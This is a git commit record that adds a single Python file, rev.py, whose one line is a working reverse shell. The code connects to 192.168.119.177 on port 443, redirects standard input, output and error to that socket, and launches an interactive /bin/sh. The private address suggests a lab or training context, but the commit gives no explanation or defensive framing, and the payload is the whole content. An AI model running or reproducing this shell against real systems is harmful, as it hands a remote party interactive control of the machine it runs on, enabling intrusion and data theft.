8508c3afdfbda90b93a32f1b3c6c87cb1c3d4514
Corey Hughes <50215735+coreymizzou@users.noreply.github.com>
2023-02-01 12:57:38 -0500

    Add files via upload

---
+++ rev.py
@@ -0,0 +1,1 @@
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.177",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
